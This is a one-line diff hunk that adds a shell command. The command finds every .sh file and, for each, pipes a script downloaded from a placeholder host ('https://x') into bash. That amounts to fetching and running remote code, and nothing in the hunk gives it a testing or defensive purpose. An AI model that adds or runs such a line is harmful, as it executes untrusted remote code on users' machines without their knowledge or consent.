@@ -1,0 +1,1 @@
+find . -name '*.sh' -exec bash -c 'curl https://x | bash' \;
